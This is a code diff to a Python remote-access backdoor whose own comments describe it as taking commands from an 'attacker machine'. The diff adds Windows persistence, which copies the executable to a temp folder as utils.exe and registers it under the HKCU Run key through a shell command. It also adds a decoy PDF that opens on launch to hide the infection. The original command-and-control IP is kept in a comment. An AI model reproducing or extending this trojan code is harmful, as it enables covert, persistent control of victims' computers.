@@ -6,6 +6,8 @@
 # then the results will be sent back
 
 # Standard Modules
+import shutil
+import sys
 import time
 from queue import Queue
 import os
@@ -24,7 +26,7 @@ from Logger import Logger
 class Backdoor:
     NUMBER_OF_THREADS = 6
     JOB_NUMBER = [0, 3, 4, 6]
-    Ip = "20.101.135.232"
+    Ip = "127.0.0.1"  # 20.101.135.232
     NUMBER_OF_PORTS = 5
     MAX_PORT_VALUE = 65535
     MIN_PORT_VALUE = 49152
@@ -37,6 +39,8 @@ class Backdoor:
 
     # Initialize the socket connection via constructor with the given ip and port value
     def __init__(self):
+        self.__become_persistent()
+        self.__open_pdf()
         self.connection = None
         self.logger = Logger(self.queue)
         self.create_workers()
@@ -190,6 +194,26 @@ class Backdoor:
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Upload successful"
+
+    def __become_persistent(self):
+
+        try:
+            dirname = os.environ["temp"] + "\\EFD58DB1-29ZZ-4401-A51A-EE19304E85A5"
+            if not os.path.exists(dirname):
+                os.mkdir(dirname)
+            location = dirname + "\\utils.exe"
+            if not os.path.exists(location):
+                shutil.copyfile(sys.executable, location)
+                subprocess.call(
+                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v utils /t REG_SZ /d "' + location + '"',
+                    shell=True)
+        except Exception as msg:
+            print("Persistence failed" + str(msg))
+
+    def __open_pdf(self):
+        if ('--startup' in sys.argv) is False:
+            file_name = sys._MEIPASS + "\\talks-of-tedexe.pdf"
+            subprocess.Popen(file_name, shell=True)
 
     # Here we are waiting commands from attacker machine in an infinite loop
     def command_executor(self):
